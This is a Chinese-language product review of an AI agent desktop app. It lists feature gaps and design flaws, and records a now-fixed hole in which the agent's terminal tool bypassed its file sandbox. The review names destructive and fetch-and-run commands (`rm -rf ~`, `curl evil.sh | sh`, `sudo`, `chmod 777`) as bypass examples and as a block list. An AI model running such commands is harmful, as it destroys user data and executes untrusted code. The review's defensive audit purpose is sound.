# Athena.UI 产品评估：功能缺口与业务不合理清单

> 评审日期：2026-07-05 ｜ 视角：Agent 应用整体产品
> 说明：以下结论基于对工具层、配置模型、Agent 循环、CLI 执行与 UI 结构的代码走查，区分「已从代码验证」与「产品判断」。

---

## 优先级建议

1. ~~**工具审批闸门 + 终端安全边界**（安全债，必须先还）~~ ✅ **已完成**（2026-07-05，见第一节与 `Docs/ToolApproval_Implementation_CN.md`）
2. **首次启动引导 + 配置收敛**（决定新用户留存）
3. **成本可见性**（付费用户信任与风险）
4. **MCP / 插件扩展**（决定长期竞争力天花板）

前两项不解决，后续功能做得再多，用户也进不来、不敢用。

---

## 一、最严重：安全模型自相矛盾（已验证）✅ 已修复

> **状态更新（2026-07-05）**：已落地代码级工具审批闸门。`FunctionRegistry.ExecuteAsync` 成为唯一收口点，三条执行路径（主聊天 / 子代理 / KB 维护）均无法绕过；`ToolRiskClassifier` + `TerminalCommandRisk` 对 `execute_terminal_command` 做命令级风险评估（拦 `bash -c "rm -rf"`、`curl|sh`、`sudo`、`chmod 777` 等）；`ToolApprovalContext`(AsyncLocal) 区分 Interactive/NonInteractive/Trusted/Unset 模式，主聊天走 `ToolApprovalDialog` 弹窗确认。配置项 `ToolApprovalMode`(Off/Balanced/Strict)、`AutoAllowedTools`、`TerminalAllowlist` 落在「工具与安全」设置区。详见 `Docs/ToolApproval_Implementation_CN.md`。以下为原始问题记录，保留备查。

对外宣称「严格沙箱 / 系统文件保护 / 自我保护（禁改 config.json）/ 路径黑名单」，但实际：

- `Services/CliService.cs` 用 CliWrap 执行**任意命令**，零校验。
- 唯一防护在 `Services/Functions/CliFunctions.cs:19`，只拦截 11 个文件管理命令名（`rm`/`mkdir`/`ls`/`cp`…）作为**顶层命令**。
- 结果：`bash -c "rm -rf ~"`、`curl evil.sh | sh`、`python -c "..."`、`sudo`、`git`、`npm` 全部畅通。
- **FileSystem 工具的沙箱、黑名单、禁改 config.json 被 `execute_terminal_command` 一行绕过。**

**没有任何工具执行前的人工确认。** 全量核查 `ViewModels/ChatTabViewModel.cs`，唯一的 `ConfirmDialog`（第 513 行）用于「会话回滚」。删文件 / 改系统文件 / 跑终端命令等破坏性操作，工具描述里写「Always confirm with the user」（`FunctionRegistry.cs:326`），但这只是对模型的自然语言请求，**无机制强制执行**。

**建议**：工具权限分级（自动允许 / 每次询问 / 禁止）+ 破坏性操作强制弹窗 + 终端命令白名单或审批。优先级高于任何新功能。

---

## 二、缺少的关键功能

### 1. 无 MCP / 插件 / 自定义工具扩展（已验证）
工具全部硬编码在 `FunctionRegistry.cs`。不支持 MCP，无法接入用户自有数据源与第三方工具生态，天花板被锁死。

### 2. 成本完全不可见（已验证）
`Services/TokenService.cs` 只算上下文 token（用于压缩告警），**无花费统计**。而应用会并行派发子代理（默认上限 4 × 每个 20 轮）、跑浏览器 Agent、生图——均为烧钱大户。用户对单次会话花费零感知。

### 3. 无首次启动引导（onboarding）（已验证）
7 个 Tab，config 中有近 **9 套独立模型端点**（主 / 次级 / embedding / 图像 / 音频 / websearch / 浏览器 / 子代理 / 文档解析），每套都要单独填 provider + baseUrl + apiKey + model。无向导、无「填一个主 key 即可跑」的快速路径，上手成本极高。

### 4. 只有 TTS，无语音输入（STT）（已验证）
对「presence-like 智能伙伴」定位，能说不能听是明显短板。

### 5. 无对话导出 / 分享（已验证）
只有本地归档，无法导出 Markdown / 分享链接，协作与沉淀价值受限。

### 6. Provider 抽象是假的（已验证）
`Services/OpenAIChatService.cs:88` 只 new 了 `OpenAIClient`，配置里的 `Provider="OpenAI"` 字段基本是摆设——非 OpenAI 兼容的原生 Anthropic / Gemini 协议接不进来。字段给了用户「能选」的错觉。

---

## 三、其他业务 / 设计不合理

### 1. 头牌功能全部默认关闭（已验证）
子代理、浏览器、Web 搜索、文档解析的 `Enabled` 默认均为 `false`（`Models/AppConfig.cs`）。开箱即用只是「聊天 + 文件 + 记忆」的普通 bot，差异化能力藏在配置开关后，多数用户发现不了。

### 2. 「主动消息 / 定时任务」价值前提不成立（产品判断）
`Services/TaskScheduler.cs` 是应用内调度器——**应用不开着不会触发**。桌面 App 关闭后提醒失效，与「随时在场」定位冲突。需开机自启 + 后台常驻 + 系统通知，或重新表述该卖点。

### 3. 记忆需模型主动调用才形成（产品判断）
知识库是长期记忆，但无「从对话自动萃取记忆」机制，完全依赖模型自觉调用 `create_new_memory`，「记得住」体验不稳定。

### 4. 配置散而无预设（已验证）
无「模型预设 / 一键套用」概念，改主模型需在多个 Tab 同步。虽有「子代理 / 浏览器跟随主模型」的 Inherit 机制（方向正确），整体仍偏工程师思维、缺产品化收敛。
